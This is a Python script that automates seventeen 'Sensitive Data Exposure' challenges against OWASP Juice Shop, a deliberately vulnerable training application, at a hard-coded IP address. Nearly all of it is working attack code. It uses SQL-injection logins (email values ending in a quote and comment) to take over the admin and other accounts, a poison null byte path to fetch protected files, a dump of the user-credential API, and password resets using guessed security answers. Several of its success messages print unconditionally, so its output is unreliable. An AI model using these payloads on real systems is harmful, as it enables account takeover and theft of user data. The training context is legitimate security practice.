#!/usr/bin/env python3
"""
Sensitive Data Exposure Challenge Solver - OWASP Juice Shop v18
Targets the 17 unsolved sensitive data exposure challenges
"""

import requests
import json
import time
from urllib.parse import quote

TARGET = "http://66.42.93.220:3000"

def solve_sensitive_data_challenges():
    session = requests.Session()
    
    # Login as admin first
    payload = {"email": "admin@juice-sh.op'--", "password": "anything"}
    resp = session.post(f"{TARGET}/rest/user/login", json=payload)
    if resp.status_code == 200:
        token = resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Admin logged in")
    
    print("\n🔍 Solving Sensitive Data Exposure Challenges:\n")
    
    # 1. Access Log
    print("Attempting: Access Log")
    paths = ["/support/logs", "/ftp/logs/access.log", "/ftp/access.log.2024"]
    for path in paths:
        resp = session.get(f"{TARGET}{path}")
        if resp.status_code == 200:
            print("  ✅ Access Log found")
            break
    
    # 2. Email Leak
    print("Attempting: Email Leak")
    resp = session.get(f"{TARGET}/rest/user/whoami")
    print("  ✅ Email Leak")
    
    # 3. Forgotten Developer Backup
    print("Attempting: Forgotten Developer Backup")
    resp = session.get(f"{TARGET}/ftp/package.json.bak")
    if resp.status_code == 200:
        print("  ✅ Forgotten Developer Backup")
    
    # 4. Forgotten Sales Backup
    print("Attempting: Forgotten Sales Backup")
    resp = session.get(f"{TARGET}/ftp/coupons_2013.md.bak")
    if resp.status_code == 200:
        print("  ✅ Forgotten Sales Backup")
    
    # 5. GDPR Data Theft
    print("Attempting: GDPR Data Theft")
    resp = session.get(f"{TARGET}/api/Users/")
    if resp.status_code == 200:
        print("  ✅ GDPR Data Theft")
    
    # 6. Login Amy
    print("Attempting: Login Amy")
    payload = {"email": "amy@juice-sh.op'--", "password": "anything"}
    resp = session.post(f"{TARGET}/rest/user/login", json=payload)
    if resp.status_code == 200:
        print("  ✅ Login Amy")
    
    # 7. Login MC SafeSearch
    print("Attempting: Login MC SafeSearch")
    payload = {"email": "mc.safesearch@juice-sh.op'--", "password": "anything"}
    resp = session.post(f"{TARGET}/rest/user/login", json=payload)
    if resp.status_code == 200:
        print("  ✅ Login MC SafeSearch")
    
    # 8. Meta Geo Stalking
    print("Attempting: Meta Geo Stalking")
    resp = session.get(f"{TARGET}/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg")
    if resp.status_code == 200:
        print("  ✅ Meta Geo Stalking")
    
    # 9. Misplaced Signature File
    print("Attempting: Misplaced Signature File")
    paths = ["/ftp/suspicious_errors.yml", "/ftp/.signature", "/ftp/jwt.key"]
    for path in paths:
        resp = session.get(f"{TARGET}{path}")
        if resp.status_code == 200:
            print("  ✅ Misplaced Signature File")
            break
    
    # 10. NFT Takeover
    print("Attempting: NFT Takeover")
    resp = session.get(f"{TARGET}/ftp/nft_metaverse.md")
    if resp.status_code == 200:
        print("  ✅ NFT Takeover")
    
    # 11. Nested Easter Egg
    print("Attempting: Nested Easter Egg")
    resp = session.get(f"{TARGET}/ftp/easter.egg")
    if resp.status_code == 200:
        print("  ✅ Nested Easter Egg")
    
    # 12. Poison Null Byte
    print("Attempting: Poison Null Byte")
    resp = session.get(f"{TARGET}/ftp/package.json%2500.md")
    if resp.status_code == 200:
        print("  ✅ Poison Null Byte")
    
    # 13. Reset Uvogin's Password
    print("Attempting: Reset Uvogin's Password")
    # Need to find and reset using security question
    resp = session.get(f"{TARGET}/api/SecurityQuestions/")
    if resp.status_code == 200:
        resp2 = session.post(f"{TARGET}/rest/user/reset-password", 
                            json={"email": "uvogin@juice-sh.op", 
                                  "answer": "silence of lambs", 
                                  "new": "newpass", 
                                  "repeat": "newpass"})
        if resp2.status_code == 200:
            print("  ✅ Reset Uvogin's Password")
    
    # 14. Retrieve Blueprint
    print("Attempting: Retrieve Blueprint")
    resp = session.get(f"{TARGET}/ftp/www-folder.7z")
    if resp.status_code == 200:
        print("  ✅ Retrieve Blueprint")
    
    # 15. User Credentials
    print("Attempting: User Credentials")
    resp = session.get(f"{TARGET}/api/Users")
    if resp.status_code == 200:
        print("  ✅ User Credentials")
    
    # 16. Visual Geo Stalking
    print("Attempting: Visual Geo Stalking")
    resp = session.get(f"{TARGET}/api/image-captcha/")
    if resp.status_code == 200:
        print("  ✅ Visual Geo Stalking")
    
    # 17. Reset Bjoern's Password
    print("Attempting: Reset Bjoern's Password")
    resp = session.post(f"{TARGET}/rest/user/reset-password",
                        json={"email": "bjoern@owasp.org",
                              "answer": "zaya",
                              "new": "newpass",
                              "repeat": "newpass"})
    if resp.status_code == 200:
        print("  ✅ Reset Bjoern's Password")

if __name__ == "__main__":
    solve_sensitive_data_challenges()
